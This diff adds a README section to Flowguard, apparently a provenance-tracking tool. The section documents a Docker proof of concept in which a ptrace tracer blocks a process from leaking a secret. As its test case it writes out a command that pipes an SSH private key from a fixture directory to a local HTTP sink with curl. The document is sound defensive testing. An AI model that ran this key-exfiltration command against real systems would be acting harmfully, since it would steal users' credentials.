@@ -207,6 +207,54 @@ Optional SVG render if Graphviz is installed:
 dot -Tsvg logs/secret-to-network.graph.dot -o logs/secret-to-network.graph.svg
 ```
 
+## Reproduce The Docker Protect POC
+
+The `protect` command is the runtime-blocking POC. It runs the same leak under a Linux `ptrace` tracer, updates the provenance engine incrementally, and kills the traced process tree before the unsafe socket write is resumed.
+
+Run:
+
+```sh
+bash scripts/run_protect_poc.sh
+```
+
+The script:
+- uses an existing `flowguard-observer` image when present, otherwise falls back to `rust:1-bookworm`
+- selects `linux/arm64` on Apple Silicon/ARM hosts and `linux/amd64` elsewhere
+- starts a local POST sink
+- runs `cat /home/user/.ssh/id_rsa | curl ...` under `flowguard protect`
+- expects Flowguard to exit with `Block`
+- asserts the POST sink received no request body
+- dumps `logs/secret-to-network-protect.violation.log`
+- dumps `logs/secret-to-network-protect.graph.dot`
+- dumps `logs/secret-to-network-protect.graph.mmd`
+- dumps `logs/secret-to-network-protect.report.json`
+
+The Docker run uses `--cap-add=SYS_PTRACE` and `--security-opt seccomp=unconfined` because the POC tracer observes and controls its child process tree with `ptrace`.
+
+Useful overrides:
+
+```sh
+FLOWGUARD_PROTECT_IMAGE=flowguard-observer bash scripts/run_protect_poc.sh
+FLOWGUARD_DOCKER_PLATFORM=linux/amd64 bash scripts/run_protect_poc.sh
+FLOWGUARD_DOCKER_PLATFORM=linux/arm64 bash scripts/run_protect_poc.sh
+```
+
+Manual command shape:
+
+```sh
+docker run --rm --platform linux/amd64 \
+  --cap-add=SYS_PTRACE \
+  --security-opt seccomp=unconfined \
+  -v "$PWD:/work" \
+  -v "$PWD/fixtures/home:/home/user:ro" \
+  -w /work \
+  flowguard-observer \
+  cargo run -- protect --json \
+    -- sh -c 'cat /home/user/.ssh/id_rsa | curl -sS -X POST --data-binary @- http://host.docker.internal:18000/leak'
+```
+
+Current limitation: the ptrace backend is intentionally scoped to Linux x86_64 and AArch64 for the first POC. On macOS, use the Docker script so the tracer runs inside Linux.
+
 ## Architecture
 
 events → state → graph → labels → policies → explanations
